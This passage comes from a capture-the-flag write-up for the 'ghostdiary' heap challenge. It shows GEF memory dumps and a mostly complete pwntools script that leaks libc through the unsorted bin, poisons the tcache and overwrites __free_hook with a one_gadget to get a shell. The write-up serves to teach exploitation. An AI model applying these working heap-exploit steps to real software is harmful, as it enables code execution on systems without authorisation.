 <span class="err">→</span>   <span class="n">Chunk</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="mh">0x55a7bc254260</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x350</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">)</span>
<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Found</span> <span class="mi">1</span> <span class="n">chunks</span> <span class="n">in</span> <span class="n">unsorted</span> <span class="n">bin</span><span class="p">.</span>

<span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">150</span><span class="n">gx</span> <span class="mh">0x55a7bc254250</span>
<span class="mh">0x55a7bc254250</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000351</span> <span class="o">&lt;-</span> <span class="n">consolidated</span> <span class="n">chunk</span> <span class="n">A</span>
<span class="mh">0x55a7bc254260</span><span class="o">:</span> <span class="mh">0x00007f7e28fbeca0</span>      <span class="mh">0x00007f7e28fbeca0</span> <span class="o">&lt;-</span> <span class="n">libc</span> <span class="n">pointers</span>
<span class="p">...</span>
<span class="mh">0x55a7bc254370</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x55a7bc254380</span><span class="o">:</span> <span class="mh">0x0000000000000130</span>      <span class="mh">0x0000000000000120</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span>
<span class="mh">0x55a7bc254390</span><span class="o">:</span> <span class="mh">0x4242424242424242</span>      <span class="mh">0x4242424242424242</span>
<span class="p">...</span>
<span class="mh">0x55a7bc2544a0</span><span class="o">:</span> <span class="mh">0x0000000000000250</span>      <span class="mh">0x0000000000000100</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">C</span>
<span class="mh">0x55a7bc2544b0</span><span class="o">:</span> <span class="mh">0x4343434343434343</span>      <span class="mh">0x4343434343434343</span>
<span class="mh">0x55a7bc2544c0</span><span class="o">:</span> <span class="mh">0x4343434343434343</span>      <span class="mh">0x4343434343434343</span>
<span class="p">...</span>
</code></pre></div></div>

<h4 id="step-7-empty-the-0x128-tcache-bin-in-order-to-use-the-unsorted-bin">Step 7: <strong>Empty the 0x128 tcache bin in order to use the unsorted bin</strong></h4>

<ul>
  <li>
    <p>We must now empty the 0x128 sized tcache bin, so that any mallocs we make with size 0x128 will come out of the unsorted bin. We need to do this because the tcache bin takes priority over the unsorted bin for allocations.</p>
  </li>
  <li>
    <p>We do this simply by allocating 7 chunks of size 0x128, so that the 7 chunks in the tcache bin of size 0x128 are taken out.</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Empty the 0x128 tcache bin so we can get chunks out of the unsorted bin
# Indexes taken up: 0, 2, 3, 4, 5, 6, 7
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x128</span><span class="p">)</span>
</code></pre></div></div>

<h4 id="step-8-allocate-chunk-a-back-again-to-move-the-libc-pointers-into-chunk-b">Step 8: <strong>Allocate chunk A back again to move the libc pointers into chunk B</strong></h4>

<ul>
  <li>We now add a chunk of size 0x128, which gets serviced by the unsorted bin. This will take a 0x128 size chunk out from the 0x350 sized chunk already in the unsorted bin and return it to us. In this case, this returns the chunk A that we initially allocated back to us.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Now adding a chunk of size 0x128 gives us a chunk from the unsorted bin
# In this case, unsorted bin will have a 0x350 sized chunk on chunk A
# We first add a 0x128 sized chunk so that the libc address gets moved down to chunk B
# This happens because now the unsorted bin will have a chunk starting at chunk B
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x128</span><span class="p">)</span> <span class="c1"># idx 8
</span></code></pre></div></div>

<ul>
  <li>The key part is that it moves the libc pointers that were in chunk A’s <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> down to chunk B, which we <strong><em>still</em></strong> have a pointer to. This is shown below:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">150</span><span class="n">gx</span> <span class="mh">0x55a7bc254250</span>
<span class="mh">0x55a7bc254250</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000131</span> <span class="o">&lt;-</span> <span class="n">allocated</span> <span class="mh">0x128</span> <span class="n">bytes</span> <span class="n">to</span> <span class="n">get</span> <span class="n">chunk</span> <span class="n">A</span>
<span class="mh">0x55a7bc254260</span><span class="o">:</span> <span class="mh">0x00007f7e28fbefe0</span>      <span class="mh">0x00007f7e28fbefe0</span>
<span class="p">...</span>
<span class="mh">0x55a7bc254380</span><span class="o">:</span> <span class="mh">0x0000000000000130</span>      <span class="mh">0x0000000000000221</span> <span class="o">&lt;-</span> <span class="n">New</span> <span class="n">consolidated</span> <span class="n">chunk</span><span class="p">,</span> <span class="n">where</span> <span class="n">chunk</span> <span class="n">B</span> <span class="n">was</span> <span class="p">(</span><span class="n">and</span> <span class="n">still</span> <span class="n">is</span><span class="p">)</span>
<span class="mh">0x55a7bc254390</span><span class="o">:</span> <span class="mh">0x00007f7e28fbeca0</span>      <span class="mh">0x00007f7e28fbeca0</span> <span class="o">&lt;-</span> <span class="n">libc</span> <span class="n">pointers</span> <span class="n">moved</span> <span class="n">down</span>
<span class="mh">0x55a7bc2543a0</span><span class="o">:</span> <span class="mh">0x4242424242424242</span>      <span class="mh">0x4242424242424242</span>
<span class="p">...</span>
<span class="mh">0x55a7bc254490</span><span class="o">:</span> <span class="mh">0x4242424242424242</span>      <span class="mh">0x4242424242424242</span>
<span class="mh">0x55a7bc2544a0</span><span class="o">:</span> <span class="mh">0x0000000000000250</span>      <span class="mh">0x0000000000000100</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">C</span>
<span class="mh">0x55a7bc2544b0</span><span class="o">:</span> <span class="mh">0x4343434343434343</span>      <span class="mh">0x4343434343434343</span>
<span class="mh">0x55a7bc2544c0</span><span class="o">:</span> <span class="mh">0x4343434343434343</span>      <span class="mh">0x4343434343434343</span>
</code></pre></div></div>

<h4 id="step-9-use-the-existing-pointer-to-chunk-b-to-read-the-libc-address-of-the-main_arena">Step 9: <strong>Use the existing pointer to chunk B to read the libc address of the main_arena</strong></h4>

<ul>
  <li>
    <p>Since we still have a pointer to chunk B, we simply use it to read chunk B’s contents. In this case, it gives us our libc pointer leak, which we use to calculate the libc base address. With the base address, we also calculate the address of <code class="highlighter-rouge">__free_hook</code>, which is a function pointer that <code class="highlighter-rouge">free()</code> uses if it is set by the user.</p>
  </li>
  <li>
    <p>With the base address, we also calculate the address of our <code class="highlighter-rouge">one_gadget</code>, which is essentially a set of instructions in libc that correspond to <code class="highlighter-rouge">execve("/bin/sh", NULL, NULL)</code>. The one gadget address is found by running david942j’s <a href="https://github.com/david942j/one_gadget">one_gadget</a> tool on <code class="highlighter-rouge">libc-2.27.so</code>.</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Now since we have a pointer to chunk B, we can leak the the fd pointer
# Remember the fd pointer just points to `main_arena+0x58`
</span><span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># Calculate needed offsets
</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f322</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'main arena leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'one gadget: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>
</code></pre></div></div>

<ul>
  <li>If we overwrite this function pointer with a pointer of our choosing, then the next time <code class="highlighter-rouge">free()</code> is called, it will also call the function pointed to by <code class="highlighter-rouge">__free_hook</code>, giving us code execution. Code found <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L3084">here</a> and shown below:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span>
<span class="nf">__libc_free</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">mem</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">mstate</span> <span class="n">ar_ptr</span><span class="p">;</span>
  <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">;</span>                          <span class="cm">/* chunk corresponding to mem */</span>

  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span>
    <span class="o">=</span> <span class="n">atomic_forced_read</span> <span class="p">(</span><span class="n">__free_hook</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">hook</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="p">(</span><span class="o">*</span><span class="n">hook</span><span class="p">)(</span><span class="n">mem</span><span class="p">,</span> <span class="n">RETURN_ADDRESS</span> <span class="p">(</span><span class="mi">0</span><span class="p">));</span> <span class="c1">// Calls the function pointed to be __free_hook</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">...</span>
</code></pre></div></div>

<ul>
  <li>We must overwrite something like <code class="highlighter-rouge">__free_hook</code> or <code class="highlighter-rouge">__malloc_hook</code> (which is malloc’s version of the function pointer) because <strong>Full RELRO</strong> is enabled. If it wasn’t, we would just overwrite a GOT table entry (<code class="highlighter-rouge">printf</code> would work).</li>
</ul>

<h4 id="step-10-tcache-poisoning-attack-to-get-malloc-to-return-an-arbitrary-pointer-to-us">Step 10: <strong>Tcache Poisoning Attack to get malloc to return an arbitrary pointer to us</strong></h4>

<ul>
  <li>Next, we do a tcache poisoning attack to get a chunk on top of <code class="highlighter-rouge">__free_hook</code>. I initially fill up the 0x128 sized tcache bin so that its easier to know which index each malloc will go into.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Fill up the 0x128 tcache bin again
# We do this to make subsequent mallocs easier to use
# It is easier to visualise the indexes in my opinion
# Indexes freed: 0, 2, 3, 4, 5, 6, 7
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
  <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Next, we add a chunk of size 0x1d8. This will get serviced by the unsorted bin since there is no tcache bin of that size. This gives us a chunk right on top of chunk B, as that was where the consolidated unsorted bin chunk was prior to this malloc. We now have overlapped chunks on top of chunk B.</p>
  </li>
  <li>
    <p>Now that we have two pointers to chunk B, we do a double free, which causes the tcache bin for 0x1d8 chunks (the 0x1d0 sized tcache bin) to have the same chunk twice:</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># At this point, the two overlapped chunks are at indexes 0 and 1
# Double free them and put them into tcache bin 0x1d8
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>The tcache bin can be visualised as follows:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcachebin</span><span class="p">[</span><span class="mh">0x1d0</span><span class="p">]</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span>
</code></pre></div></div>

<ul>
  <li>We allocate a chunk of size 0x1d8 again, which gives us back one of the chunks from the 0x1d0 sized tcache bin.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Add one of them, change its fd to __free_hook
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x1d8</span><span class="p">)</span> <span class="c1"># idx 0
</span></code></pre></div></div>

<ul>
  <li>The tcache bin now looks like the following:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcachebin</span><span class="p">[</span><span class="mh">0x1d0</span><span class="p">]</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span>
</code></pre></div></div>

<ul>
  <li>We set chunk B’s <code class="highlighter-rouge">fd</code> pointer to the address of <code class="highlighter-rouge">__free_hook</code>.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">talk</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>The tcache bin now looks like this:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">tcachebin</span><span class="p">[</span><span class="mh">0x1d0</span><span class="p">]</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span> <span class="o">&lt;-</span> <span class="o">&amp;</span><span class="n">__free_hook</span>
</code></pre></div></div>

<ul>
  <li>We do two more mallocs of size 0x1d8, where the first malloc gives us chunk B from the tcache bin, and the second malloc gives us a chunk right on top of <code class="highlighter-rouge">__free_hook</code>.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Two more chunks and we get a chunk on __free_hook
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x1d8</span><span class="p">)</span> <span class="c1"># 1, overlapped chunk with chunk B again
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x1d8</span><span class="p">)</span> <span class="c1"># 2, chunk on __free_hook
</span></code></pre></div></div>

<ul>
  <li>We then overwrite that chunk on <code class="highlighter-rouge">__free_hook</code> with the address of our one_gadget:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Overwrite __free_hook with one_gadget
</span><span class="n">talk</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x7f7e28fc08e8</span>
<span class="mh">0x7f7e28fc08e8</span> <span class="o">&lt;</span><span class="n">__free_hook</span><span class="o">&gt;:</span>   <span class="mh">0x00007f7e28c22322</span>      <span class="mh">0x0000000000000000</span>
<span class="p">...</span>
</code></pre></div></div>

<ul>
  <li>Finally, we call <code class="highlighter-rouge">free()</code> one more time, which calls the function pointed to by <code class="highlighter-rouge">__free_hook</code>, which is our one gadget, thus giving us a shell.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Trigger __free_hook which gives us shell
</span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h4 id="final-exploit">Final exploit</h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ghostdiary'</span><span class="p">)</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./ghostdiary'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="p">)</span>

<span class="c1"># Credits to teamrocketist for the following two functions, they help immensely when trying
# to debug exploits
</span><span class="k">def</span> <span class="nf">get_base_address</span><span class="p">(</span><span class="n">proc</span><span class="p">):</span>
  <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s">"/proc/{}/maps"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pid</span><span class="p">),</span> <span class="s">'rb'</span><span class="p">)</span><span class="o">.</span><span class="n">readlines</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">'-'</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">breakpoints</span><span class="p">):</span>
  <span class="n">script</span> <span class="o">=</span> <span class="s">""</span>
  <span class="n">PIE</span> <span class="o">=</span> <span class="n">get_base_address</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
  <span class="k">for</span> <span class="n">bp</span> <span class="ow">in</span> <span class="n">breakpoints</span><span class="p">:</span>
    <span class="n">script</span> <span class="o">+=</span> <span class="s">"b *0x</span><span class="si">%</span><span class="s">x</span><span class="se">\n</span><span class="s">"</span><span class="o">%</span><span class="p">(</span><span class="n">PIE</span><span class="o">+</span><span class="n">bp</span><span class="p">)</span>
  <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">script</span><span class="p">)</span>

<span class="c1"># Application logic functions
</span><span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>

  <span class="k">if</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0xf0</span><span class="p">:</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>

  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">talk</span><span class="p">(</span><span class="n">page</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">page</span><span class="p">))</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">listen</span><span class="p">(</span><span class="n">page</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'3'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">page</span><span class="p">))</span>
  <span class="n">content</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">': '</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">content</span>

<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">page</span><span class="p">):</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'4'</span><span class="p">)</span>
  <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">page</span><span class="p">))</span>

<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
  <span class="n">debug</span><span class="p">([</span><span class="mh">0x1024</span><span class="p">])</span>

<span class="c1"># Exploit goes here
</span>
<span class="c1"># Setup
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x128</span><span class="p">)</span> <span class="c1"># A, idx 0
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x118</span><span class="p">)</span> <span class="c1"># B, idx 1
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x118</span><span class="p">)</span> <span class="c1"># C, idx 2
</span>
<span class="c1"># Fill up tcache bin 0xf0
# Done because the NULL byte overflow will unset the PREV_INUSE bit of the next chunk
# Meaning that it will change the next chunks size to 0x100
# 0x100 chunks go into the 0xf0 tcache bin
# We prevent this since we want backwards consolidation to occur
# This will be evident further below
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
  <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>

<span class="c1"># Fill up tcache bin 0x128
# We do this because of the same reason above
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x128</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
  <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>

<span class="c1"># Make chunk A go into unsorted bin
# This is important because we are consolidating chunk C back with both chunks A and B
# Meaning that unlink will be called with chunk A as it's second argument
# unlink has some security checks, one being that A's fd and bk must have valid pointers
# This free will put the pointers to `main_arena+0x58` into the fd and bk of A
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1"># Null byte overflow onto chunk C.
# C's size is now 0x100.
# C's prev_size is also set to 0x250
</span><span class="n">talk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x110</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x250</span><span class="p">))</span>

<span class="c1"># Before we free chunk C, we must create a fake chunk 0x100 bytes after chunk C
# This fake chunk must have its PREV_INUSE bit set to 1, hence we choose size 0x21
# This is required to bypass some checks when a chunk is freed into the unsorted bin
</span><span class="n">talk</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

<span class="c1"># We free C now.
# C's prev_size is 0x250, so it will consolidate backwards 0x250 bytes (all the way up to A)
# Unsorted bin will now have a 0x350 sized chunk right on top of A
# A's fd and bk pointers will still have pointers to `main_arena+0x58`
</span><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>

<span class="c1"># Empty the 0x128 tcache bin so we can get chunks out of the unsorted bin
# Indexes taken up: 0, 2, 3, 4, 5, 6, 7
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x128</span><span class="p">)</span>

<span class="c1"># Now adding a chunk of size 0x128 gives us a chunk from the unsorted bin
# In this case, unsorted bin will have a 0x350 sized chunk on chunk A
# We first add a 0x128 sized chunk so that the libc address gets moved down to chunk B
# This happens because now the unsorted bin will have a chunk starting at chunk B
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x128</span><span class="p">)</span> <span class="c1"># idx 8
</span>
<span class="c1"># Now since we have a pointer to chunk B, we can leak the the fd pointer
# Remember the fd pointer just points to `main_arena+0x58`
</span><span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">listen</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>

<span class="c1"># Calculate needed offsets
</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3ebca0</span>
<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4f322</span>
<span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span>

<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'main arena leak: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_leak</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Libc base: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'one gadget: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'free_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>

<span class="c1"># Fill up the 0x128 tcache bin again
# We do this to make subsequent mallocs easier to use
# It is easier to visualise the indexes in my opinion
# Indexes freed: 0, 2, 3, 4, 5, 6, 7
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
  <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>

<span class="c1"># Add overlapped chunk with B with size 0x1d8, this creates a new tcache bin when freed
# The new tcache bin is used for the tcache poisoning attack
# Otherwise there are some checks to bypass if we do an fastbin attack (for example)
# It's just easier to do it with the tcache bins
